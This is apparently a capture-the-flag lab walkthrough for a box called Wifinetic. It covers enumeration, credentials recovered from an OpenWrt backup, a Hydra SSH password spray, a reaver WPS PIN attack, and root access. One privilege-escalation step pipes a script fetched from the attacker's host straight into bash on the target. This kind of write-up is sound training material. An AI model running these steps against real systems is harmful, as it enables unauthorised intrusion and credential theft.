## Box: Wifinetic

## Target IP: `10.10.11.247`

---

### Initial Nmap Scan

Ran:

```bash
sudo nmap -sC -sV -p- --min-rate 10000 10.10.11.247
```

Results:

| Port | Service | Version |
| --- | --- | --- |
| 21 | ftp | vsftpd 3.0.3 (anonymous login allowed) |
| 22 | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 |
| 53 | tcpwrapped | - |

---

### FTP Enumeration

Logged in anonymously:

```bash
ftp 10.10.11.247
```

Downloaded everything:

```bash
wget -r ftp://10.10.11.247
```

Found:

- `MigrateOpenWrt.txt`
- `ProjectGreatMigration.pdf`
- `ProjectOpenWRT.pdf`
- `backup-OpenWrt-2023-07-26.tar`
- `employees_wellness.pdf`

---

### File Analysis

Checked `MigrateOpenWrt.txt`. Mostly noise. Some mentions of wireless configs.

Ran `exiftool` on PDFs. No credential leaks.

Read PDFs manually. Pulled a username:

`SamanthaWood93`.

Started building a `users.txt` list. Added `SamanthaWood93`.

Extracted the tar archive:

```bash
mkdir backup
cd backup
tar xvf ../ftp/backup-OpenWrt-2023-07-26.tar
```

Found `/etc/` dump. In `passwd`:

- `netadmin` user.

Added `netadmin` to `users.txt`.

Saw `/etc/config/wireless`:

- WiFi PSK: `[REDACTED]`

Looked like a reused password.

---

### Gaining Access

Used Hydra to spray SSH login:

```bash
hydra -L users.txt -p [REDACTED] 10.10.11.247 ssh

```

Login successful for `netadmin`.

Manual SSH in:

```bash
ssh netadmin@10.10.11.247
```

Password: `[REDACTED]`.

In.

---

### Initial Enumeration

Checked network interfaces:

```bash
ip a
```

Found:

- eth0 (standard)
- wlan0, wlan1, wlan2 (wireless NICs)
- mon0 (monitor mode interface)

Looked like a VM with simulated WiFi.

---

### Privilege Escalation

Set up a Python web server:

```bash
mkdir www
cd www
cp /opt/linpeas/linpeas.sh .
python3 -m http.server 8000
```

On victim:

```bash
curl 10.10.14.15:8000/linpeas.sh | bash
```

LinPEAS scan showed:

- `/usr/bin/reaver` with `cap_net_raw+ep`.

Setuid capabilities on `reaver`.

---

### Exploiting WiFi

Scanned networks:

```bash
iwlist scan
```

Found:

- ESSID: OpenWrt
- BSSID: 02:00:00:00:00:00

Attacked WPS:

```bash
reaver -i mon0 -b 02:00:00:00:00:00
```

Cracked WPS PIN.

Recovered WPA PSK:

```
[REDACTED]!
```

---

### Root Access

Tried SSH as root:

```bash
ssh root@10.10.11.247
```

Password: `[REDACTED]!`

Logged in immediately.

---

### Flags

User flag:

```bash
cd /home/netadmin
cat user.txt
```

Root flag:

```bash
cd /root
cat root.txt
```
